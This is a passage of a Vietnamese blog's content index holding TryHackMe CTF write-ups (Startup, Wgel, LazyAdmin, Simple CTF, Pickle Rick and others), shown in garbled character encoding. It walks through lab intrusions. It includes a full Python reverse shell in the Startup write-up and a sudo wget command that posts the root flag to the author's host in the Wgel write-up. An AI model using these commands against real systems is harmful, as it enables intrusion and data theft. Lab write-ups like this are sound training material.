trá» vá» mÃ¡y local. NhÆ°ng cÃ³ váº» lÃ  khÃ´ng Ä‘Æ°á»£c, ká»ƒ cáº£ cÃ¡c shell khÃ¡c.\nÃ€! CÃ²n cÃ¡ch khÃ¡c. TÃ´i sáº½ upload file shell php tá»« mÃ¡y local.\nTáº¡o http server tá»« mÃ¡y local.\nSau Ä‘Ã³ dÃ¹ng wget Ä‘á»ƒ táº£i file tá»« mÃ¡y local vá» remote server.\nBáº­t netcat vÃ  má»Ÿ file trÃªn browser. http://MACHIEN-IP/shell.php\nTruy cáº­p user www-data vÃ  tÃ´i cÃ³ user flag.\nBÃ¢y giá» Ä‘áº¿n bÆ°á»›c leo thang Ä‘áº·c quyá»n. TÃ´i Ä‘Ã£ thá»­ vÃ i thá»© Ä‘Æ¡n giáº£n nhÆ° sudo -l hay crontab Ä‘á»u khÃ´ng cÃ³ káº¿t quáº£ gÃ¬. VÃ¬ váº­y, tÃ´i sáº½ táº¡o http server báº±ng python vÃ  wget linPEAS.\nDáº¡o quanh 1 Ä‘á»‘ng vÃ´ cÃ¹ng nhiá»u thá»© nÃ y thÃ¬ tÃ´i tÃ¬m Ä‘Æ°á»£c vÃ i thÃ´ng tin trong databse fuel_schema.\nNháº­p thá»­ pass nÃ y vá»›i root, xong.\nRooted!\n","date":"20 October 2021","externalUrl":null,"permalink":"/ctf/tryhackme/ignite/","section":"Ctf","summary":"","title":"Tryhackme - Ignite","type":"ctf"},{"content":"HÃ´m nay tÃ´i sáº½ giáº£i CTF Tryhackme - Startup. GÃ©c gÃ´!!!\nVáº«n nhÆ° thÃ´ng thÆ°á»ng thÃ´i, viá»‡c Ä‘áº§u tiÃªn cáº§n lÃ m lÃ  quÃ©t cá»•ng.\nChÃºng ta cÃ³ 3 port Ä‘ang má»Ÿ:\nport 21 vá»›i ftp server vÃ  cho phÃ©p login báº±ng anonymous. port 22 cháº¡y ssh trÃªn ubuntu server port 80 vá»›i Apache httpd 2.4.18 trÃªn ubuntu server Vá»›i port 21, tÃ´i cÃ³ vÃ i thá»© hay ho á»Ÿ Ä‘Ã¢y.\nTrong ftp server tÃ´i cÃ³ 1 file txt vÃ  1 file áº£nh, user anonymous cÅ©ng cÃ³ quyá»n sá»­a, ghi file. Váº­y lÃ  tÃ´i cÃ³ thá»ƒ upload file lÃªn ftp server, tÃ´i khÃ´ng cháº¯c. Xem qua 2 file kia Ä‘Ã£.\nTÃ´i cÃ³ 1 cÃ¡i tÃªn á»Ÿ Ä‘Ã¢y: Maya. CÃ²n chiáº¿c áº£nh kia thÃ¬ khÃ´ng cÃ³ gÃ¬ Ä‘áº·c biá»‡t láº¯m. TÃ´i sáº½ quay láº¡i ftp server Ä‘á»ƒ put shell lÃªn xem cÃ³ Ä‘Æ°á»£c khÃ´ng.\nÄÆ°á»£c rá»“i. BÃ¢y giá» thá»­ check web path Ä‘á»ƒ xem cÃ³ tÃ¬m Ä‘Æ°á»£c url cá»§a file vá»«a up khÃ´ng.\nVÃ o path /files vÃ  tÃ´i tÃ¬m tháº¥y ftp file server.\nTáº¡o listener vá»›i port Ä‘Ã£ cáº¥u hÃ¬nh bÃªn trong shell vÃ  thá»­ má»Ÿ file.\ná»’ Ä‘Æ°á»£c rá»“i nÃ y. Config láº¡i shell 1 chÃºt vá»›i python Ä‘á»ƒ dá»… khai thÃ¡c hÆ¡n. Trong file server web chÃºng ta cÃ³ 1 file recipe.txt. Má»Ÿ file nÃ y vÃ  tÃ´i tÃ¬m Ä‘Æ°á»£c secret spicy soup recipe.\nVÃ o thÆ° má»¥c /home vÃ  tÃ´i cÃ³ user lennie. Tuy nhiÃªn khÃ´ng cáº§n cÃ³ password. TÃ´i thá»­ check xem cÃ³ thÆ° má»¥c nÃ o cháº¡y quyá»n cá»§a www-data khÃ´ng. VÃ  tÃ´i tÃ¬m tháº¥y thÆ° má»¥c incidents.\nTrong nÃ y cÃ³ 1 file pcap, clone nÃ³ vá» vÃ  thá»­ check báº±ng Wireshark xem cÃ³ tÃ¬m Ä‘Æ°á»£c gÃ¬ Ä‘áº·c biá»‡t khÃ´ng, biáº¿t Ä‘Ã¢u láº¡i cÃ³ password cá»§a Lennie. TÃ´i táº¡o http server báº±ng python trÃªn mÃ¡y remote vÃ  wget file pcap vá» mÃ¡y local cá»§a mÃ¬nh, Ä‘Ã¡p nÃ³ vÃ o Wireshark thÃ´i.\nSau 1 thá»i gian dÃ i ngá»¥p láº·n, tÃ´i Ä‘Ã£ tÃ¬m Ä‘Æ°á»£c password cá»§a user lennie, trong file pcap.\nÄÄƒng nháº­p vÃ  tÃ´i cÃ³ user flag.\nViá»‡c tiáº¿p theo lÃ  leo thang Ä‘áº·c quyá»n. CÃ¹ng vá»›i user flag tÃ´i cÃ³ thÃªm 2 folder ná»¯a vÃ  folder scripts cÃ³ chá»©a file thá»±c thi. TÃ´i sáº½ khai thÃ¡c nÃ³ trÆ°á»›c. File planner.sh sáº½ ghi Ä‘á» 1 list vÃ o file startup_list.txt vÃ  sau Ä‘Ã³ thá»±c thi file /etc/print.sh. TÃ´i check qua file print.sh thÃ¬ nÃ³ Ä‘ang cháº¡y dÆ°á»›i quyá»n user lennie, Ä‘iá»u nÃ y cÃ³ nghÄ©a lÃ  chÃºng ta cÃ³ thá»ƒ sá»­a Ä‘Æ°á»£c file nÃ y.\nTÃ´i sáº½ thÃªm reverse shell vÃ o file nÃ y, nhÆ°ng khÃ´ng thá»ƒ get root Ä‘Æ°á»£c. Do file planner.sh nÃ y cÃ³ thá»ƒ cháº¡y Ä‘Æ°á»£c nÃªn tÃ´i sáº½ thá»­ kiá»ƒm tra xem nÃ³ cÃ³ pháº£i 1 cronjob cháº¡y dÆ°á»›i quyá»n root hay khÃ´ng. VÃ  Ä‘Ãºng lÃ  nhÆ° váº­y.\nNÃªn viá»‡c tiáº¿p theo lÃ  sá»­a file nÃ y Ä‘á»ƒ gá»i reverse shell. TÃ´i sáº½ dÃ¹ng shell nÃ y\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026quot;10.8.**.**\u0026quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026quot;/bin/bash\u0026quot;,\u0026quot;-i\u0026quot;]);'\nÃ€ trÆ°á»›c tiÃªn pháº£i táº¡o listener Ä‘Ã£.\nVáº­y lÃ  xong. Rooted!\n","date":"15 October 2021","externalUrl":null,"permalink":"/ctf/tryhackme/startup/","section":"Ctf","summary":"","title":"Tryhackme - Startup","type":"ctf"},{"content":"HÃ´m nay tÃ´i sáº½ giáº£i CTF Tryhackme - Wgel CTF. GÃ©c gÃ´!!!\nReconnaissance # Váº«n nhÆ° thÃ´ng thÆ°á»ng thÃ´i, viá»‡c Ä‘áº§u tiÃªn cáº§n lÃ m lÃ  quÃ©t cá»•ng.\nPORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpgV7/18RfM9BJUBOcZI/eIARrxAgEeD062pw9L24Ulo5LbBeuFIv7hfRWE/kWUWdqHf082nfWKImTAHVMCeJudQbKtL1SBJYwdNo6QCQyHkHXslVb9CV1Ck3wgcje8zLbrml7OYpwBlumLVo2StfonQUKjfsKHhR+idd3/P5V3abActQLU8zB0a4m3TbsrZ9Hhs/QIjgsEdPsQEjCzvPHhTQCEywIpd/GGDXqfNPB0Yl/dQghTALyvf71EtmaX/fsPYTiCGDQAOYy3RvOitHQCf4XVvqEsgzLnUbqISGugF8ajO5iiY2GiZUUWVn4MVV1jVhfQ0kC3ybNrQvaVcXd | 256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDCxodQaK+2npyk3RZ1Z6S88i6lZp2kVWS6/f955mcgkYRrV1IMAVQ+jRd5sOKvoK8rflUPajKc9vY5Yhk2mPj8= | 256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJhXt+ZEjzJRbb2rVnXOzdp5kDKb11LfddnkcyURkYke 80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works | http-methods: |_ Supported Methods: OPTIONS GET HEAD POST |_http-server-header: Apache/2.4.18 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Vá»›i port 80 tÃ´i cÃ³ 1 default page apache ubuntu server. LÆ°á»›t qua page thÃ¬ cÃ³ 1 chÃºt ká»³ láº¡, tÃ´i xem qua source code:\n\u0026lt;!-- Jessie don't forget to udate the webiste --\u0026gt;\nTiáº¿p tá»¥c dÃ¹ng dirsearch Ä‘á»ƒ tÃ¬m web path vÃ  tÃ´i tÃ¬m Ä‘Æ°á»£c /sitemap/. VÃ o url thÃ¬ Ä‘Ã¢y lÃ  má»™t blog html, cÅ©ng khÃ´ng cÃ³ gÃ¬ Ä‘áº·c biá»‡t. TÃ´i thá»­ check thÃ´ng tin site:\nhttp://10.10.253.207/sitemap/ [200 OK] Apache[2.4.18], Bootstrap, Country[RESERVED][ZZ], Email[info@yoursite.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.253.207], JQuery, Modernizr[2.6.2.min], Open-Graph-Protocol, Script, Title[unapp Template], X-UA-Compatible[IE=edge] TÃ´i tháº¥y cÃ³ Modernizr [2.6.2.min], Ä‘Ã¢y lÃ  má»™t thÆ° viá»‡n java nÃªn thá»­ tÃ¬m xem cÃ³ exploit nÃ o khÃ´ng, tuy nhiÃªn cÅ©ng khÃ´ng cÃ³ gÃ¬ há»¯u Ã­ch. Váº­y nÃªn tÃ´i thá»­ tÃ¬m web path thÃªm láº§n ná»¯a Ä‘á»ƒ xem á»Ÿ sau /sitemap/ cÃ³ gÃ¬ khÃ´ng.\n200 - 955B - /sitemap/.ssh/ 200 - 2KB - /sitemap/.ssh/id_rsa SSH # TÃ´i sáº½ thá»­ táº£i ssh key nÃ y vá» vÃ o login báº±ng username Jessie Ä‘Ã£ tÃ¬m Ä‘Æ°á»£c á»Ÿ trÃªn.\nâ”Œâ”€[neo@parrot]â”€[~] â””â”€â”€â•¼ $sudo ssh -i id_rsa jessie@10.10.20.15 Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 8 packages can be updated. 8 updates are security updates. Last login: Tue Jul 19 11:45:25 2022 from 10.18.3.74 jessie@CorpOne:~$ VÃ  tÃ´i tÃ¬m Ä‘Æ°á»£c user flag trong thÆ° má»¥c Document\njessie@CorpOne:~/Documents$ ls user_flag.txt Privilege escalation # Thá»­ check xem Jessie cÃ³ truy cáº­p file nÃ o vá»›i quyá»n root hay khÃ´ng\nUser jessie may run the following commands on CorpOne: (ALL : ALL) ALL (root) NOPASSWD: /usr/bin/wget Qua GTFOBins Ä‘á»ƒ tÃ¬m wget. CÃ³ váº» nhÆ° vá»›i wget chÃºng ta cÃ³ thá»ƒ táº£i file vá» local machine. TÃ´i sáº½ thá»­ dÃ¹ng nÃ³ Ä‘á»ƒ táº£i root flag trong thÆ° má»¥c root. VÃ  vá»›i tÃªn user_flag thÃ¬ tÃ´i nghÄ© root flag cÅ©ng sáº½ cÃ³ kiá»ƒu format nhÆ° tháº¿ nÃ y.\nThá»­ táº¡o listener trÃªn local machine vÃ  lÆ°u dá»¯ liá»‡u vÃ o file flag\nâ”Œâ”€[neo@parrot]â”€[~] â””â”€â”€â•¼ $sudo nc -lnvp 80 \u0026gt; flag Sau Ä‘Ã³ táº¡o 1 POST request tá»« remote machine Ä‘áº¿n local machine.\njessie@CorpOne:/etc$ sudo /usr/bin/wget --post-file=/root/root_flag.txt 10.18.3.74 Má»Ÿ file flag vÃ  tÃ´i cÃ³ root flag. CÃ²n Ä‘á»ƒ leo thang Ä‘áº·c quyá»n báº±ng wget tÃ´i sáº½ nÃ³i á»Ÿ 1 bÃ i sau.\nTá»•ng káº¿t # Thá»±c sá»± thÃ¬ bÃ i nÃ y khÃ´ng cÃ³ ká»¹ thuáº­t gÃ¬ má»›i, chÃº yáº¿u lÃ  Ä‘á»ƒ luyá»‡n thÃªm vá» recon, cÃ¡ch login ssh báº±ng rsa key, sá»­ dá»¥ng wget Ä‘á»ƒ láº¥y Ä‘Æ°á»£c file vá» local machine vÃ  sau Ä‘Ã³ cÃ³ thá»ƒ get root báº±ng cÃ¡ch Ä‘áº©y file chá»©a password cá»§a mÃ¬nh.\n","date":"30 September 2021","externalUrl":null,"permalink":"/ctf/tryhackme/wgel-ctf/","section":"Ctf","summary":"","title":"Tryhackme - Wgel CTF","type":"ctf"},{"content":"HÃ´m nay tÃ´i sáº½ giáº£i CTF Tryhackme - LazyAdmin. GÃ©c gÃ´!!!\nVáº«n nhÆ° thÃ´ng thÆ°á»ng thÃ´i, viá»‡c Ä‘áº§u tiÃªn cáº§n lÃ m lÃ  quÃ©t cá»•ng. TÃ´i sáº½ dÃ¹ng Rustscan cho nhanh vÃ  thÃªm vÃ i tÃ¹y chá»n cá»§a nmap.\nChÃºng ta cÃ³ 2 port Ä‘ang má»Ÿ:\nport 22 cháº¡y ssh trÃªn ubuntu server port 80 vá»›i Apache httpd 2.4.18 trÃªn ubuntu server Vá»›i header nÃ y cÃ³ váº» nhÆ° web chá»‰ lÃ  default page Apache. Kiá»ƒm tra source web cÅ©ng khÃ´ng cÃ³ gÃ¬ Ä‘áº·c biá»‡t.\nThá»­ dirsearch Ä‘á»ƒ tÃ¬m web path nÃ o. Tháº±ng nÃ y cÃº phÃ¡p Ä‘Æ¡n giáº£n hÆ¡n gobuster vÃ¬ nÃ³ cÃ³ sáºµn wordlist khÃ¡ Ä‘áº§y Ä‘á»§ vÃ  cÃ²n Ä‘Æ°á»£c cáº­p nháº­t.\nThá»­ vÃ o path vÃ  tÃ´i cÃ³ 1 site index cá»§a basic-cms sweetrice.\nThá»­ tÃ¬m trÃªn exploit-db vÃ  tÃ´i tÃ¬m Ä‘Æ°á»£c exploit upload file: 40716. Xem qua exploit nÃ y thÃ¬ tÃ´i tháº¥y cÃ³ vÃ i path á»Ÿ Ä‘Ã¢y.\nVáº­y cÃ³ thá»ƒ lÃ  sau /content/ váº«n cÃ²n cÃ³ cÃ¡c path ná»¯a.\nThá»­ thÃªm 1 láº§n dirsearch ná»¯a xem sao.\nVÃ  tÃ´i cÃ³ thÃªm cÃ¡c path cá»§a site sweetrice, trong Ä‘Ã³ cÃ³ path /as/ dáº«n Ä‘áº¿n site login vÃ  path /inc/ chá»©a cÃ¡c file há»‡ thá»‘ng. TÃ´i Ä‘á»ƒ Ã½ cÃ³ mysql_backup á»Ÿ Ä‘Ã¢y. Thá»­ táº£i vÃ  kiá»ƒm tra xem cÃ³ user vÃ  password khÃ´ng nÃ o.\nÄÃ¢y rá»“i! TÃ´i cÃ³ username vÃ  password vá»›i hash md5. VÃ o Crackstations Ä‘á»ƒ unhash password. Login thÃ´i.\nDashboard nÃ y nhiá»u thá»© quÃ¡, tÃ´i nhá»› ra exploit lÃºc nÃ£y cáº§n username vÃ  password Ä‘á»ƒ upload file. Váº­y thÃ¬ thá»­ thÃ´i upload reverse shell nÃ o.\nÄÆ°á»£c rá»“i nÃ y. Äiá»u lÆ°u Ã½ á»Ÿ Ä‘Ã¢y lÃ  cáº§n pháº£i Ä‘á»•i .php sang .php5, náº¿u Ä‘á»ƒ .php thÃ¬ server khÃ´ng cho upload.\nBáº­t netcat lÃªn vá»›i listen port Ä‘Ã£ táº¡o trong shell: nc -lnvp 1234\nConfig láº¡i session vá»›i python.\npython3 -c â€˜import pty;pty.spawn(â€/bin/bashâ€)â€™\nexport TERM=xterm\nCtrl+Z\nstty raw -echo; fg\nTÃ¬m trong thÆ° má»¥c /home/ cÃ³ user itguy, vÃ  tÃ´i tÃ¬m Ä‘Æ°á»£c user flag á»Ÿ Ä‘Ã¢y.\nBÃ¢y giá» thÃ¬ thá»­ tÃ¬m xem cÃ³ thÆ° má»¥c nÃ o cháº¡y báº±ng quyá»n root khÃ´ng.\nQua GTFOBins tÃ¬m perl nÃ o.\nSá»­ dá»¥ng sudo nhÆ°ng khÃ´ng Ä‘Æ°á»£c vÃ¬ yÃªu cáº§u pass cá»§a user web.\nTÃ´i cÃ²n 1 file vá»›i quyá»n root ná»¯a mÃ  khÃ´ng cáº§n pass lÃ  backup.pl.\nXem ná»™i dung file copy.sh thÃ¬ nÃ³ lÃ  1 reverse shell khÃ¡c. Sá»­a file nÃ y Ä‘á»ƒ nÃ³ trá» vá» mÃ¡y local cá»§a tÃ´i.\nDÃ¹ng netcat Ä‘á»ƒ get shell\nRooted.\nTÃ¬m Ä‘Æ°á»£c rá»“i! ftpuser:ftpuser@123\n","date":"22 September 2021","externalUrl":null,"permalink":"/ctf/tryhackme/lazyadmin/","section":"Ctf","summary":"","title":"Tryhackme - LazyAdmin","type":"ctf"},{"content":"HÃ´m nay tÃ´i sáº½ giáº£i CTF Tryhackme - Bounty Hacker. GÃ©c gÃ´!!!\nVáº«n nhÆ° thÃ´ng thÆ°á»ng thÃ´i, viá»‡c Ä‘áº§u tiÃªn cáº§n lÃ m lÃ  quÃ©t cá»•ng. TÃ´i sáº½ dÃ¹ng rustscan cho nhanh vÃ  thÃªm vÃ i tÃ¹y chá»n cá»§a nmap.\nCÃ³ 3 port Ä‘ang má»Ÿ:\nPort 21 cháº¡y ftp-vsftpd 3.0.3 cÃ³ thá»ƒ login vá»›i Anonymous Port 22 cháº¡y ssh service trÃªn Ubuntu server Port 80 cháº¡y web service vá»›i Apache 2.4.18 trÃªn Ubuntu TÃ´i thá»­ login vÃ o ftp server vá»›i anonymous.\nTÃ´i cÃ³ 2 file txt á»Ÿ Ä‘Ã¢y. Clone nÃ³ vá» mÃ¡y Ä‘á»ƒ xem cÃ³ thÃ´ng tin gÃ¬ khÃ´ng.\nget locks.txt /home/neo/locks.txt\nget task.txt /home/neo/task.txt\nTÃ´i cÃ³ 1 cÃ¡i tÃªn á»Ÿ Ä‘Ã¢y: lin\nVá»›i file locks.txt, tÃ´i cÃ³ 1 list mÃ  tÃ´i nghÄ© sáº½ dÃ¹ng Ä‘á»ƒ brute-force. Váº­y lÃ  tÃ´i cÃ³ 1 cÃ¡i tÃªn vÃ  1 wordlist. Thá»­ vÃ o web xem cÃ³ nÆ¡i nÃ o Ä‘á»ƒ login khÃ´ng.\nTÃ´i cÃ³ 1 trang html vá» 1 cuá»™c há»™i thoáº¡i vÃ  vÃ i cÃ¡i tÃªn. KhÃ´ng cÃ³ gÃ¬ Ä‘áº·c biá»‡t hay ká»³ láº¡ á»Ÿ Ä‘Ã¢y, máº¥y dir cÆ¡ báº£n cÅ©ng khÃ´ng cÃ³. TÃ´i dÃ¹ng dirsearch Ä‘á»ƒ tÃ¬m dir nhÆ°ng cÅ©ng khÃ´ng thu Ä‘Æ°á»£c gÃ¬.\nVáº­y thÃ¬ login vÃ o Ä‘Ã¢u? Chá»‰ cÃ²n ssh thÃ´i. Hail Hydra!!!\nLogin vÃ o ssh vÃ  tÃ´i cÃ³ user flag náº±m trong desktop.\nThá»­ tÃ¬m xem cÃ³ thÆ° má»¥c nÃ o cháº¡y vá»›i quyá»n root khÃ´ng.\nVÃ o GTFOBins xem cÃ³ tar trong Ä‘Ã³ khÃ´ng.\nThá»­ xem cÃ³ get root Ä‘Æ°á»£c khÃ´ng nÃ o.\nDone.\n","date":"15 September 2021","externalUrl":null,"permalink":"/ctf/tryhackme/bounty-hacker/","section":"Ctf","summary":"","title":"Tryhackme - Bounty Hacker","type":"ctf"},{"content":"HÃ´m nay tÃ´i sáº½ giáº£i CTF Tryhackme - Simple CTF. GÃ©c gÃ´!!!\nVáº«n nhÆ° thÆ°á»ng lá»‡, viá»‡c Ä‘áº§u tiÃªn cáº§n lÃ m lÃ  quÃ©t cá»•ng. TÃ´i sáº½ dÃ¹ng rustscan cho nhanh. Æ¯u Ä‘iá»ƒm cá»§a tháº±ng nÃ y lÃ  quÃ©t full port ráº¥t nhanh, ngoÃ i ra nÃ³ cÅ©ng cÃ³ thá»ƒ tÃ­ch há»£p nmap.\nCÃ³ 3 port Ä‘ang má»Ÿ:\nPort 21 cháº¡y ftp-vsftpd 3.0.3 Port 80 cháº¡y web service vá»›i Apache 2.4.18 trÃªn Ubuntu Port 2222 cháº¡y ssh service Vá»›i port 21, chÃºng ta cÃ³ thá»ƒ login vá»›i Anonymous.\nTuy nhiÃªn khi tÃ´i thá»­ list file, server timeout. TÃ´i thá»­ tÃ¬m trÃªn exploit-db Ä‘á»ƒ xem cÃ³ exploit nÃ o cho phiÃªn báº£n 3.0.3 nÃ y khÃ´ng, chá»‰ cÃ³ 1 exploit vá» DoS.\nÄá»ƒ láº¡i Ä‘Ã³ váº­y. ChÃºng ta sáº½ check qua web xem sao.\nTÃ´i cÃ³ 1 robots.txt vá»›i 2 disallow enties. NhÆ°ng cÃ³ váº» nhÆ° khÃ´ng vÃ o Ä‘Æ°á»£c.\nTuy nhiÃªn tÃ´i tÃ¬m Ä‘Æ°á»£c 1 cÃ¡i tÃªn á»Ÿ Ä‘Ã¢y: mike.\nTÃ´i cÅ©ng khÃ´ng cháº¯c nhÆ°ng cá»© lÆ°u láº¡i váº­y.\nTÃ´i tháº¥y cÃ³ chÃºt ká»³ láº¡ á»Ÿ entry thá»© 2 nÃªn Ä‘Ã£ check gg. áº¦u, ra rá»“i! Openemr lÃ  má»™t pháº§n má»m quáº£n lÃ½ y táº¿ vÃ  phiÃªn báº£n 5.0.1.3 cÃ³ CVE-2018-15139. NhÆ°ng cÃ³ váº» nhÆ° khÃ´ng cÃ³ tÃ¡c dá»¥ng láº¯m do khÃ´ng cÃ³ username vÃ  password.\nLáº¡i dirsearch Ä‘á»ƒ tÃ¬m directory thÃ´i.\nTÃ´i tÃ¬m ra 1 path má»›i dáº«n Ä‘áº¿n 1 cms khÃ¡c - CMS Made Simple vá»›i phiÃªn báº£n 2.2.8.\nThá»­ check qua CVE vÃ  tÃ´i cÃ³ CVE-2019-9053 sá»­ dá»¥ng SQLi Ä‘á»ƒ login mÃ  khÃ´ng cáº§n password. Check searchsploit vÃ  tÃ´i cÃ³ sploit 46635.\nCheck qua exploit thÃ¬ tÃ´i tá»± há»i táº¡i sao vÃ o nÄƒm 2019 mÃ  nghá»‡ sÄ© nÃ y váº«n cÃ²n dÃ¹ng python2 nhá»‰??? Anyway, thá»­ exploit nÃ o.\nVÃ  tÃ´i tÃ¬m Ä‘Æ°á»£c password: secret. Login vÃ o vÃ  dáº¡o qua 1 vÃ²ng Ä‘á»ƒ tÃ¬m xem cÃ³ chá»— nÃ o upload shell Ä‘Æ°á»£c khÃ´ng, nhÆ°ng site nÃ y nhiá»u thá»© quÃ¡, tÃ´i hÆ¡i lÆ°á»i.\nTÃ´i nhá»› ra mÃ¬nh cÃ²n port 2222 ssh ná»¯a mÃ .\nThá»­ ssh vá»›i user vÃ  password á»Ÿ port 2222 xem sao.\nTada! á» Ä‘Ã¢y tÃ´i cÃ³ user.txt\ná» thÆ° má»¥c /home, tÃ´i cÃ³ 2 user mitch vÃ  sunbath.\nBÃ¢y giá» thá»­ tÃ¬m xem cÃ³ cÃ¡i gÃ¬ cháº¡y vá»›i root khÃ´ng.\nVim cháº¡y vá»›i quyá»n root khÃ´ng cáº§n password. Qua GTFOBins tÃ¬m vim nÃ o.\nChÃºng ta cÃ³ 2 cÃ¡ch Ä‘á»ƒ láº¥y Ä‘Æ°á»£c root flag. 1 lÃ  dÃ¹ng vim Ä‘á»ƒ má»Ÿ file luÃ´n, cÃ¡ch nÃ y thÃ¬ pháº£i xÃ¡c Ä‘á»‹nh Ä‘Æ°á»£c vá»‹ trÃ­ cá»§a file, vÃ  thÆ°á»ng thÃ¬ root flag sáº½ náº±m trong thÆ° má»¥c root rá»“i. CÃ²n cÃ¡ch thá»© 2 lÃ  chiáº¿m quyá»n root thÃ´i.\nVá»›i cÃ¡ch 1 tÃ´i chá»‰nh sá»­a file nhÆ° thÆ°á»ng thÃ´i\nVá»›i cÃ¡ch 2 sá»­ dá»¥ng GTFOBins Sudo\nÄÃ£ xong. Rooted!!!\n","date":"12 September 2021","externalUrl":null,"permalink":"/ctf/tryhackme/simple-ctf/","section":"Ctf","summary":"","title":"Tryhackme - Simple CTF","type":"ctf"},{"content":"","date":"11 September 2021","externalUrl":null,"permalink":"/tags/html/","section":"Tags","summary":"","title":"Html","type":"tags"},{"content":"\u0026ldquo;This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.\u0026rdquo;\nHÃ´m nay tÃ´i sáº½ giáº£i CTF Tryhackme - Pickle Rick. GÃ©c gÃ´!!!\nVáº«n nhÆ° thÃ´ng thÆ°á»ng thÃ´i, viá»‡c Ä‘áº§u tiÃªn cáº§n lÃ m lÃ  quÃ©t cá»•ng. TÃ´i sáº½ dÃ¹ng rustscan cho nhanh.\nChÃºng ta cÃ³ 2 port Ä‘ang má»Ÿ:\nport 22 cá»•ng ssh trÃªn ubuntu server port 80 vá»›i Apache httpd 2.4.18 trÃªn ubuntu server CÃ¹ng check qua site vá»›i port 80 nÃ o.\nHmmm\u0026hellip; CÅ©ng khÃ´ng cÃ³ gÃ¬ Ä‘áº·c biá»‡t láº¯m. Thá»­ check qua source xem sao.\nTÃ´i cÃ³ thÃªm 1 link áº£nh vÃ  1 username.\nThÆ°á»ng thÃ¬ Ä‘á»ƒ trÃ¡nh máº¥t thá»i gian tÃ´i sáº½ check thá»­ qua cÃ¡c uri phá»• biáº¿n: robots.txt, admin, login.php, upload.php, vÃ¢n vÃ¢n mÃ¢y mÃ¢y\u0026hellip;\nSau 1 lÃºc loay hoay thÃ¬ tÃ´i cÃ³ thÃªm 2 uri lÃ  robots.txt vÃ  login.php.\nVÃ  vá»›i robots.txt \u0026ldquo;huyá»n thoáº¡i\u0026rdquo;, tÃ´i cÃ³ thÃªm 1 dÃ²ng text \u0026ldquo;Wubbalubbadubdub\u0026rdquo; mÃ  tÃ´i cÅ©ng chÆ°a hiá»ƒu láº¯m nhÆ°ng thÃ´i cá»© lÆ°u láº¡i, coi nhÆ° hint.\nVá»›i login site, tÃ´i Ä‘Ã£ thá»­ vÃ  SQLi vÃ  XSS nhÆ°ng khÃ´ng cÃ³ gÃ¬ Ä‘áº·c sáº¯c láº¯m.\nVáº­y lÃ  chÃºng ta cÃ³ 1 site login, cÃ³ 1 username vÃ  1 Ä‘oáº¡n text. Sao khÃ´ng thá»­ láº¥y Ä‘oáº¡n text kia lÃ m password? Bingo!!!\nTa cÃ³ 1 dashboard Ä‘Æ¡n giáº£n vÃ  chá»‰ dÃ¹ng Ä‘Æ°á»£c má»¥c commands, cÃ¡c má»¥c khÃ¡c cáº§n pháº£i Ä‘Äƒng nháº­p báº±ng \u0026ldquo;REAL rick\u0026rdquo; chÄƒng???\nQuay láº¡i Command Panel, tÃ´i nháº­n ra nÃ³ giá»‘ng nhÆ° 1 terminal káº¿t ná»‘i server khi nháº­p \u0026ldquo;whoami\u0026rdquo; vÃ  nÃ³ tráº£ láº¡i \u0026ldquo;www-data\u0026rdquo;.\nThá»­ list file vÃ  tÃ´i cÃ³ 1 file txt khÃ¡ Ä‘áº·c biá»‡t.\nVÃ  vÃ¬ nÃ³ náº±m trong thÆ° má»¥c web nÃªn thá»­ má»Ÿ nÃ³ nhÆ° 1 uri, chÃºng ta cÃ³ flag Ä‘áº§u tiÃªn.\n\u0026ldquo;ls\u0026rdquo; 1 lÃºc thÃ¬ tÃ´i tÃ¬m Ä‘Æ°á»£c 2 user á»Ÿ trong /home lÃ  rick vÃ  ubuntu, trong user rick chÃºng ta tÃ¬m Ä‘Æ°á»£c file chá»©a flag thá»© 2.\nTuy nhiÃªn chÃºng ta khÃ´ng thá»ƒ dÃ¹ng \u0026ldquo;cat\u0026rdquo; Ä‘á»ƒ má»Ÿ Ä‘Æ°á»£c file nÃ y. Sau má»™t lÃºc google thÃ¬ tÃ´i tÃ¬m Ä‘Æ°á»£c \u0026ldquo;less\u0026rdquo; cÅ©ng tÆ°Æ¡ng tá»± nhÆ° \u0026ldquo;cat\u0026rdquo;.\nSá»­ dá»¥ng less vÃ  chÃºng ta cÃ³ flag thá»© 2.\nÄáº¿n Ä‘Ã¢y thÃ¬ thá»±c sá»± tÃ´i chÆ°a nghÄ© ra Ä‘Æ°á»£c cÃ¡ch tÃ¬m flag thá»© 3. TÃ´i Ä‘Ã£ thá»­ tÃ¬m file báº±ng tÃªn vá»›i hi vá»ng tÃªn file flag thá»© 3 cÅ©ng giá»‘ng nhÆ° flag 2: second ingredients nhÆ°ng khÃ´ng cÃ³ gÃ¬.\nThÃ´ng thÆ°á»ng, Ä‘á»ƒ cÃ³ Ä‘Æ°á»£c flag cuá»‘i chÃºng ta pháº£i leo thang Ä‘áº·c quyá»n lÃªn root, vÃ  Ä‘a sá»‘ flag cuá»‘i náº±m trong thÆ° má»¥c root.\nTrong 1 phÃºt ngÃ¡o ngÆ¡ tÃ´i quÃªn máº¥t sudo -l =))))\nÄiá»u nÃ y cÃ³ nghÄ©a lÃ  chÃºng ta cÃ³ toÃ n 